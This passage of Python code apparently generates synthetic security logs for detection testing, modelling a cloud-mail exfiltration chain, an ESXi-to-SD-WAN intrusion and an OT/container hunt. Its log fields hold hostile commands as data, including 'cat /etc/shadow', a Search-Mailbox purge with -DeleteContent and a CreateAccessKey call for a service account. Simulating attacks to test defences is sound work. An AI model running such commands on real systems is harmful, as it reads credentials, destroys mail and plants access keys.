    """Cloud-mail exfil chain: Duo anomaly -> mail trace -> SaaS egress."""
    duo = Node(id="wave3-duo-admin", name="duo-admin-console",
               type=NodeType.WEB_SERVER, ip_address="10.42.31.12")
    gmail = Node(id="wave3-gmail", name="gsuite-mail",
                 type=NodeType.WEB_SERVER, ip_address="10.42.31.14")
    m365 = Node(id="wave3-m365", name="m365-exo",
                type=NodeType.WEB_SERVER, ip_address="10.42.31.16")
    zs = Node(id="wave3-zs", name="zscaler-edge",
              type=NodeType.SASE_PROXY, ip_address="10.42.31.18")
    cf = Node(id="wave3-cloudfront", name="cloudfront-edge",
              type=NodeType.SASE_PROXY, ip_address="10.42.31.20")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W3.format_cisco_duo_admin_log(
        device=duo, family="activity_event", src_ip="10.42.31.120",
        action_name="admin_login", status="normal"))
    base.append(W3.format_o365_messagetrace_log(
        device=m365, family="message_trace", src_ip="10.42.31.16",
        dest_ip="52.96.0.1", status="normal"))
    secs.extend(_tag(base, run_id, "wave3_cloudmail_exfil", "BASELINE"))

    recon: List[LogEntry] = []
    recon.append(W3.format_zscaler_nss_web_log(
        device=zs, family="web_proxy_allow", src_ip="10.42.31.55",
        dest_ip="104.20.23.154", url="https://pastebin-pool.com/gh",
        url_category="Information Technology", status="degraded"))
    recon.append(W3.format_cisco_duo_admin_log(
        device=duo, family="admin_action", src_ip=attacker,
        action_name="policy_download",
        description={"policies": "BaselineAccess: EX0NPUWQ7DB7KCYDEFV2"},
        status="degraded", action="alerted"))
    secs.extend(_tag(recon, run_id, "wave3_cloudmail_exfil", "RECON"))

    exfil: List[LogEntry] = []
    exfil.append(W3.format_gmail_bigquery_log(
        device=gmail, family="gmail_message_event",
        src_ip="10.42.31.14", dest_ip=attacker,
        recipient="vault-drop@external_test_email.com",
        subject="Q3 invoice bundle", status="breached",
        action="alerted"))
    exfil.append(W3.format_o365_graph_messagetrace_log(
        device=m365, family="graph_message_trace",
        src_ip="10.42.31.16", dest_ip=attacker,
        recipient="vault-drop@external_test_email.com",
        subject="Q3 invoice bundle", status="breached",
        action="alerted"))
    exfil.append(W3.format_aws_cloudfront_log(
        device=cf, family="edge_access", src_ip=attacker,
        dest_ip="18.244.7.9",
        origin_host="staging-bucket-812381231.s3.amazonaws.com",
        signature="exfil-stage", status="breached", action="alerted"))
    exfil.append(W3.format_aws_cloudtrail_lake_log(
        device=cf, family="ocsf_api_activity", src_ip=attacker,
        dest_ip="52.94.76.11",
        api_operation="CreateAccessKey",
        request_data='{"userName":"svc-vault"}',
        response_data='{"accessKey":{"userName":"svc-vault"}}',
        signature="key-staging", status="breached", action="alerted"))
    secs.extend(_tag(exfil, run_id, "wave3_cloudmail_exfil", "EXFIL"))

    contain: List[LogEntry] = []
    contain.append(W3.format_zscaler_nss_web_log(
        device=zs, family="web_proxy_block", src_ip="10.42.31.55",
        dest_ip=attacker, url="http://%s/drop/q3.zip" % attacker,
        url_category="File Sharing", reason="Malicious Bot",
        status="breached", action="blocked"))
    contain.append(W3.format_cisco_duo_admin_log(
        device=duo, family="admin_action", src_ip="10.42.31.120",
        action_name="policy_bulk_delete",
        status="breached"))
    contain.append(W3.format_cisco_ravpn_log(
        device=zs, family="vpn_auth_reject", src_ip=attacker,
        dest_ip="10.42.31.18", signature="ravpn-block",
        status="breached"))
    secs.extend(_tag(contain, run_id, "wave3_cloudmail_exfil", "CONTAIN"))
    return secs


def _vsphere_hostpath_triage(run_id: str, attacker: str) -> List[LogEntry]:
    """Hypervisor + identity triage: ESXi shell reads -> SD-WAN mgmt access."""
    esxi = Node(id="wave3-esxi", name="esxi-host-01",
                type=NodeType.WEB_SERVER, ip_address="192.168.8.233")
    lin = Node(id="wave3-vma", name="vma-01",
               type=NodeType.WEB_SERVER, ip_address="10.42.41.30")
    sdwan = Node(id="wave3-vsmart", name="vSmart-01",
                 type=NodeType.ROUTER, ip_address="10.42.41.40")
    wins = Node(id="wave3-win-system", name="WIN-DC-01",
                type=NodeType.WEB_SERVER, ip_address="10.42.41.50")
    dhcp = Node(id="wave3-dhcp", name="dhcp-srv-01",
                type=NodeType.FIREWALL, ip_address="10.42.41.60")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(W3.format_windows_system_xml_log(
        device=wins, family="system_service_event", src_ip="127.0.0.1",
        dest_ip=wins.ip_address, event_id=6005,
        message="The Event log service was started.", status="normal"))
    base.append(W3.format_cisco_sdwan_syslog_log(
        device=sdwan, family="vdaemon_control_change",
        src_ip=sdwan.ip_address, dest_ip="10.42.41.1", status="normal"))
    base.append(W3.format_dhcpd_log(
        device=dhcp, family="dhcpack", src_ip=dhcp.ip_address,
        dest_ip="10.42.41.88", lease_ip="10.42.41.88", status="normal"))
    secs.extend(_tag(base, run_id, "wave3_vsphere_hostpath_triage",
                     "BASELINE"))

    fault: List[LogEntry] = []
    fault.append(W3.format_iis_log(
        device=wins, family="w3c_access", src_ip="10.42.41.88",
        dest_ip=wins.ip_address, status="normal"))
    fault.append(W3.format_vmw_syslog_log(
        device=esxi, family="shell_command", src_ip=attacker,
        shell_command="cat /etc/shadow", status="breached",
        action="alerted"))
    fault.append(W3.format_linux_secure_log(
        device=lin, family="su_message", src_ip=esxi.ip_address,
        dest_ip=lin.ip_address, status="breached", action="alerted"))
    fault.append(W3.format_linux_secure_log(
        device=lin, family="pam_session", src_ip=esxi.ip_address,
        dest_ip=lin.ip_address, status="breached", action="alerted"))
    fault.append(W3.format_linux_secure_log(
        device=lin, family="sshd_message", src_ip=attacker,
        dest_ip=lin.ip_address, signature="linux-ssh", status="breached"))
    secs.extend(_tag(fault, run_id, "wave3_vsphere_hostpath_triage",
                     "FAULT"))

    spread: List[LogEntry] = []
    spread.append(W3.format_cisco_sdwan_access_log(
        device=sdwan, family="mgmt_proxy_access", src_ip=esxi.ip_address,
        signature="sdwan-mgmt-probe", status="breached"))
    spread.append(W3.format_cisco_ios_syslog_log(
        device=sdwan, family="sec_login_failure", src_ip=esxi.ip_address,
        reason="BadPassword", localport=22, status="breached",
        signature="ios-ssh"))
    spread.append(W3.format_msexchange_log(
        device=wins, family="cmdlet_event", src_ip=esxi.ip_address,
        dest_ip=wins.ip_address,
        cmdlet="Search-Mailbox",
        cmdlet_params="-Identity \"Helpdesk@corp.local\" "
                      "-SearchQuery \"Subject:invoice\" "
                      "-DeleteContent \"True\"",
        signature="exchange-purge", status="breached"))
    secs.extend(_tag(spread, run_id, "wave3_vsphere_hostpath_triage",
                     "PROPAGATE"))

    val: List[LogEntry] = []
    val.append(W3.format_vmw_syslog_log(
        device=esxi, family="hostd_event", src_ip="10.42.41.90",
        status="normal"))
    val.append(W3.format_cisco_meraki_syslog_log(
        device=esxi, family="urls", src_ip="10.42.41.88",
        dest_ip="104.20.23.154", status="normal"))
    secs.extend(_tag(val, run_id, "wave3_vsphere_hostpath_triage",
                     "VALIDATE"))
    return secs


# ---------------------------------------------------------------------------
# Universal Vendor Coverage batch-1 pack: OT/IDS + web proxy + host IDS +
# container runtime hunt. Consumer of every batch-1 canonical row
# (docker_events, bluecoat:proxysg:access:file, wazuh:alerts,
# nozomi:universal_alert) so the batch keeps the zero-orphan invariant.
# ---------------------------------------------------------------------------
def _ub1_ot_proxy_host_hunt(run_id: str, attacker: str) -> List[LogEntry]:
    """OT tamper -> proxy exfil attempt -> host rootcheck -> container host."""
    ddi = Node(id="ub1-ddi", name="n2os-guardian-sandbox-01",
               type=NodeType.OPTICAL_CORE, ip_address="1.128.0.0")
    plc = Node(id="ub1-plc", name="ab-ethip-c1-1756",
               type=NodeType.STORAGE_SAN, ip_address="1.128.0.11")
    sg = Node(id="ub1-sg", name="proxysg-edge-01",
              type=NodeType.SASE_PROXY, ip_address="10.82.255.36")
    host = Node(id="ub1-host", name="docker-host-01",
                type=NodeType.WEB_SERVER, ip_address="172.17.0.2")
    secs: List[LogEntry] = []

    base: List[LogEntry] = []
    base.append(UB1.format_docker_events_log(
        device=host, family="container_lifecycle", status="normal"))
    base.append(UB1.format_proxysg_access_log(
        device=sg, family="proxy_observed", src_ip="10.82.255.36",
        dest_ip="34.111.113.62", status="normal"))
    secs.extend(_tag(base, run_id, "ub1_ot_proxy_host_hunt", "BASELINE"))

    fault: List[LogEntry] = []
    fault.append(UB1.format_nozomi_alert_log(
        device=ddi, family="ot_ids_program_change",
        src_ip=plc.ip_address, dest_ip=ddi.ip_address,
        status="breached", action="alerted"))
    secs.extend(_tag(fault, run_id, "ub1_ot_proxy_host_hunt", "FAULT"))

    spread: List[LogEntry] = []
    spread.append(UB1.format_proxysg_access_log(
        device=sg, family="proxy_denied", src_ip="172.17.0.2",
        dest_ip="34.111.113.62", status="breached", action="blocked"))
    spread.append(UB1.format_docker_events_log(
        device=host, family="network_connect", status="breached",
        action="alerted"))
    secs.extend(_tag(spread, run_id, "ub1_ot_proxy_host_hunt",
                     "PROPAGATE"))

    val: List[LogEntry] = []
    val.append(UB1.format_wazuh_alert_log(
        device=host, family="rootcheck_hidden_process", status="breached",
        action="alerted"))
    val.append(UB1.format_wazuh_alert_log(
        device=host, family="rootcheck_hidden_file", status="breached",
        action="alerted"))
    secs.extend(_tag(val, run_id, "ub1_ot_proxy_host_hunt", "VALIDATE"))
    return secs
